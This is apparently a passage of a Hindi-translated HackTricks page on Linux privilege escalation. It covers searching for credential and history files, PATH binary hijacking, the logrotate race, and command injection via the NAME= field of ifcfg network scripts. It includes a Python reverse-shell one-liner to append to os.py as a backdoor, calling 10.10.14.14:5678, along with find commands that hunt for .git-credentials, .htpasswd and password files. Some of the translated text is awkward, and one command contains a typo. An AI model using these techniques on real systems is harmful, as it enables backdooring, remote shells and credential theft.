### \*\_history, .sudo\_as\_admin\_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml फ़ाइलें
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### छिपे हुए फ़ाइलें

छिपे हुए फ़ाइलें वे फ़ाइलें होती हैं जो निर्दिष्ट निर्देशिका में छिपी होती हैं और आमतौर पर उपयोगकर्ता द्वारा देखी नहीं जा सकती हैं। ये फ़ाइलें अक्सर सुरक्षा उद्देश्यों के लिए उपयोगी होती हैं, क्योंकि वे अनधिकृत उपयोगकर्ताओं से छिपी रहती हैं और उन्हें अनुमति नहीं देती हैं।

छिपे हुए फ़ाइलों को खोजने के लिए, आप निम्नलिखित कमांड का उपयोग कर सकते हैं:

```bash
ls -a
```

इस कमांड के द्वारा, आप सभी छिपे हुए फ़ाइलों को देख सकते हैं जो निर्दिष्ट निर्देशिका में मौजूद हैं। छिपे हुए फ़ाइलों के नाम में आमतौर पर डॉट (.) से शुरू होता है।

छिपे हुए फ़ाइलों को देखने के बाद, आप उन्हें देखने या संपादित करने के लिए उपयोगकर्ता अनुमतियों को संशोधित कर सकते हैं।
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **पाथ में स्क्रिप्ट/बाइनरी** 

If you find a script or binary in a directory that is included in the system's PATH environment variable, you may be able to escalate your privileges by replacing the legitimate file with a malicious one. 

यदि आपको पाठ्य प्रणाली के पाथ परिवर्तन चर के रूप में शामिल निर्देशिका में एक स्क्रिप्ट या बाइनरी मिलती है, तो आप वास्तविक फ़ाइल को एक ख़तरनाक फ़ाइल के साथ बदलकर अपनी प्रिविलेज़ को बढ़ा सकते हैं।

To identify scripts or binaries in the PATH, you can use the `which` command followed by the name of the file you are looking for. 

पाथ में स्क्रिप्ट या बाइनरी की पहचान करने के लिए, आप खोज रहे फ़ाइल के नाम के बाद `which` कमांड का उपयोग कर सकते हैं।

For example, if you want to find the location of the `sudo` binary, you can run the following command:

उदाहरण के लिए, यदि आप `sudo` बाइनरी की स्थान पता करना चाहते हैं, तो आप निम्नलिखित कमांड चला सकते हैं:

```bash
which sudo
```

If the output shows a writable directory, you can create a malicious script or binary with the same name and place it in that directory. When the system executes the command, it will run your malicious code instead of the legitimate one, potentially allowing you to escalate your privileges. 

यदि आउटपुट एक लिखने योग्य निर्देशिका दिखाता है, तो आप उसी नाम के साथ एक ख़तरनाक स्क्रिप्ट या बाइनरी बना सकते हैं और उस निर्देशिका में रख सकते हैं। जब प्रणाली कमांड को निष्पादित करती है, तो यह आपके ख़तरनाक कोड को वास्तविक के बजाय चलाएगी, जिससे आपको अपनी प्रिविलेज़ को बढ़ाने की संभावना हो सकती है।

It is important to note that this technique requires write access to a directory in the PATH and may require root privileges to replace certain system binaries. 

इस तकनीक में पाठ में एक निर्देशिका में लिखने की पहुंच की आवश्यकता होती है और कुछ सिस्टम बाइनरी को बदलने के लिए रूट प्रिविलेज़ की आवश्यकता हो सकती है।
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type -f -executable 2>/dev/null; done
```
### **वेब फ़ाइलें**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **बैकअप्स**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### ज्ञात पासवर्ड संबंधी फ़ाइलें

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) कोड को पढ़ें, यह **कई संभावित फ़ाइलें खोजता है जो पासवर्ड संबंधी हो सकती हैं**।\
इसके अलावा, आप इसका उपयोग करके एक और **दिलचस्प उपकरण** कर सकते हैं: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) जो एक ओपन सोर्स एप्लिकेशन है और इसका उपयोग करके आप विंडोज, लिनक्स और मैक पर संग्रहीत कई पासवर्ड प्राप्त कर सकते हैं।

### लॉग

यदि आप लॉग पढ़ सकते हैं, तो आपको उनमें **दिलचस्प/गोपनीय जानकारी** मिल सकती है। जितना अजीब लॉग होगा, उतना दिलचस्प होगा (संभावना है)।\
इसके अलावा, कुछ "**बुरे**" कॉन्फ़िगर किए गए (बैकडोर?) **ऑडिट लॉग** आपको ऑडिट लॉग में पासवर्ड रिकॉर्ड करने की अनुमति दे सकते हैं, जैसा कि इस पोस्ट में समझाया गया है: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/)।
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
यदि आप **ग्रुप [adm](interesting-groups-linux-pe/#adm-group)** के लॉग पढ़ना चाहते हैं तो यह बहुत मददगार साबित होगा।

### शैल फ़ाइलें
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### जेनेरिक क्रेड सर्च/रेजेक्स

आपको फ़ाइलें भी चेक करनी चाहिए जिनमें शब्द "**पासवर्ड**" होता है उसके **नाम** या **सामग्री** में, और लॉग में या हैश रेजेक्स में आईपी और ईमेल भी चेक करें।\
मैं यहां सभी चेक करने के तरीकों की सूची नहीं दे रहा हूँ लेकिन यदि आपको इंटरेस्ट है तो आप नीचे दिए गए चेक कर सकते हैं जो [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) करता है।

## लिखने योग्य फ़ाइलें

### पायथन पुस्तकालय हाइजैकिंग

यदि आपको पता है कि पायथन स्क्रिप्ट को **कहां से** चलाया जाएगा और आप उस फ़ोल्डर में **लिख सकते हैं** या आप **पायथन पुस्तकालयों को संशोधित कर सकते हैं**, तो आप ओएस पुस्तकालय को संशोधित करके उसे बैकडोर कर सकते हैं (यदि आप पायथन स्क्रिप्ट को चलाने वाले जगह पर लिख सकते हैं, तो os.py पुस्तकालय की कॉपी और पेस्ट करें)।

पुस्तकालय को **बैकडोर करने** के लिए, os.py पुस्तकालय के अंत में निम्नलिखित पंक्ति जोड़ें (आईपी और पोर्ट बदलें):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### लॉगरोटेशन शोषण

`लॉगरोटेशन` पर एक संकट है जो किसी उपयोगकर्ता को **लॉग फ़ाइल पर लिखने की अनुमति** या इसके **किसी भी माता-पिता निर्देशिका** में होने पर `लॉगरोटेशन` को **किसी भी स्थान पर एक फ़ाइल लिखने** की अनुमति देता है। यदि **लॉगरोटेशन** को **रूट** द्वारा निष्पादित किया जा रहा है, तो उपयोगकर्ता को किसी भी फ़ाइल को _**/etc/bash\_completion.d/**_ में लिखने की अनुमति होगी जो कि किसी भी उपयोगकर्ता द्वारा लॉगिन करने पर निष्पादित की जाएगी।\
तो, यदि आपके पास एक **लॉग फ़ाइल** या इसके **माता-पिता फ़ोल्डर** में **लिखने की अनुमति** है, तो आप **उच्चतम अधिकार प्राप्त कर सकते हैं** (अधिकांश लिनक्स वितरणों पर, लॉगरोटेशन रोजाना एक बार **रूट उपयोगकर्ता** के रूप में स्वचालित रूप से निष्पादित होता है)। इसके अलावा, देखें कि _/var/log_ के अलावा और भी फ़ाइलें **रोटेट** हो रही हैं या नहीं।

{% hint style="info" %}
यह संकट `लॉगरोटेशन` संस्करण `3.18.0` और पुराने संस्करणों पर प्रभावित करता है
{% endhint %}

इस संकट का विस्तृत जानकारी इस पृष्ठ पर मिल सकती है: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

आप इस संकट का शोषण कर सकते हैं [**logrotten**](https://github.com/whotwagner/logrotten) के साथ।

यह संकट [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx लॉग),** के बहुत समान है, इसलिए जब भी आपको पता चले कि आप लॉग को बदल सकते हैं, तो देखें कि वे लॉग का प्रबंधन कौन कर रहा है और क्या आप लॉग को सिमलिंक्स के द्वारा उच्चतम अधिकार प्राप्त करके उच्चतम अधिकार प्राप्त कर सकते हैं।

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

यदि, किसी कारण से, एक उपयोगकर्ता को _/etc/sysconfig/network-scripts_ में एक `ifcf-<whatever>` स्क्रिप्ट **लिखने** की अनुमति होती है **या** वह एक मौजूदा स्क्रिप्ट को **समायोजित** कर सकता है, तो आपका **सिस्टम पूनःप्राप्त हो जाता है**।

नेटवर्क स्क्रिप्ट, उदाहरण के लिए _ifcg-eth0_, नेटवर्क कनेक्शन के लिए उपयोग होते हैं। वे .INI फ़ाइलों के तरह दिखते हैं। हालांकि, वे लिनक्स पर नेटवर्क प्रबंधक (डिस्पैचर.d) द्वारा \~स्रोतित\~ होते हैं।

मेरे मामले में, इन नेटवर्क स्क्रिप्ट में `NAME=` विशेषता सही ढंग से हैंडल नहीं की जाती है। यदि आपके पास नाम में **सफेद/खाली जगह** है, तो सिस्टम को सफेद/खाली जगह के बाद का हिस्सा निष्पादित करने की कोशिश की जाती है। इसका मतलब है कि **पहले सफेद/खाली जगह के बाद का हर चीज़ रूट के रूप में निष्पादित की जाती है**।

उदाहरण के लिए: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
**विकर्षण संदर्भ:** [**https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)

### **init, init.d, systemd, और rc.d**

`/etc/init.d` में **स्क्रिप्ट** होते हैं जो सिस्टम V इनिट टूल्स (SysVinit) द्वारा उपयोग किए जाते हैं। यह लिनक्स के लिए **पारंपरिक सेवा प्रबंधन पैकेज** है, जिसमें `init` प्रोग्राम (जब कर्नल की प्रारंभिककरण पूरा हो जाता है¹) और कुछ अवयव होते हैं जो सेवाओं को शुरू और बंद करने और उन्हें कॉन्फ़िगर करने के लिए उपयोग होते हैं। विशेष रूप से, `/etc/init.d` में फ़ाइलें शेल स्क्रिप्ट होती हैं जो किसी विशेष सेवा को प्रबंधित करने के लिए `start`, `stop`, `restart`, और (जब समर्थित हो) `reload` कमांड का प्रतिक्रिया करती हैं। इन स्क्रिप्ट्स को सीधे या (सबसे आमतौर पर) किसी अन्य ट्रिगर (आमतौर पर `/etc/rc?.d/` में एक प्रतीक लिंक की मौजूदगी) के माध्यम से आह्वान किया जा सकता है। (यहां से [यहां](https://askubuntu.com/questions/5039/what-is-the-difference-between-etc-init-and-etc-init-d) देखें)। इस फ़ोल्डर का एक अन्य विकल्प Redhat में `/etc/rc.d/init.d` है।

`/etc/init` में **कॉन्फ़िगरेशन** फ़ाइलें होती हैं जो **अपस्टार्ट** द्वारा उपयोग की जाती हैं। अपस्टार्ट एक युवा **सेवा प्रबंधन पैकेज** है जिसे यूबंटू द्वारा प्रशंसा की जाती है। `/etc/init` में फ़ाइलें अपस्टार्ट को बताती हैं कि कैसे और कब सेवा को `start`, `stop`, `reload` करना है, या कॉन्फ़िगरेशन की `status` का पूछताछ करना है। ल्यूसिड के रूप में, यूबंटू सिसवीइनिट से अपस्टार्ट में स्थानांतरित हो रहा है, जिसले यह समझ में आता है कि यदि उपस्थित होने के बावजूद अपस्टार्ट कॉन्फ़िगरेशन फ़ाइलें पसंद की जाती हैं तो सिसवीइनिट स्क्रिप्ट्स के साथ बहुत सारी सेवाएं आती हैं। यूपस्टार्ट में सिसवीइनिट स्क्रिप्ट्स एक संगतता परत में प्रसंस्कृत होते हैं। (यहां से [यहां](https://askubuntu.com/questions/5039/what-is-the-difference-between-etc-init-and-etc-init-d) देखें)।

**सिस्टमड** एक **लिनक्स प्रारंभण प्रणाली और सेवा प्रबंधक** है जिसमें ऑन-डिमांड डीमन्स की प्रारंभिकरण, माउंट और ऑटोमाउंट पॉइंट रखरखाव, स्नैपशॉट समर्थन और लिनक्स कंट्रोल समूह का उपयोग करके प्रक्रियाओं का ट्रैकिंग शामिल हैं। सिस्टमड एक लॉगिंग डीमान और अन्य उपकरण और उपयोगिताएं प्रदान करता है जो सामान्य सिस्टम प्रशासन कार्यों में मदद करने के लिए होते हैं। (यहां से [यहां](https://www.linode.com/docs/quick-answers/linux-essentials/what-is-systemd/) देखें)।

वितरण भंडार से डाउनलोड की गई पैकेजों में शामिल फ़ाइलें `/usr/lib/systemd/` में जाती हैं। प्रणालिका प्रशासक (उपयोगकर्ता) द्वारा किए गए संशोधन `/etc/systemd/system/` में जाते हैं।

## अन्य ट्रिक्स

### NFS विशेषाधिकार वृद्धि

{% content-ref url="nfs-no_root_squash-misconfiguration-pe.md" %}
[nfs-no\_root\_squash-misconfiguration-pe.md](nfs-no\_root\_squash-misconfiguration-pe.md)
{% endcontent-ref %}

### सीमित शैल्ड से बाहर निकलना

{% content-ref url="escaping-from-limited-bash.md" %}
[escaping-from-limited-bash.md](escaping-from-limited-bash.md)
{% endcontent-ref %}

### सिस्को - vmanage

{% content-ref url="cisco-vmanage.md" %}
[cisco-vmanage.md](cisco-vmanage.md)
{% endcontent-ref %}

## कर
* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS की नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का एक्सेस** चाहिए? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा एक्सक्लूसिव [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह देखें
* [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में **शामिल हों** या मुझे **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **अपने हैकिंग ट्रिक्स को** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **में PR जमा करके साझा करें।**
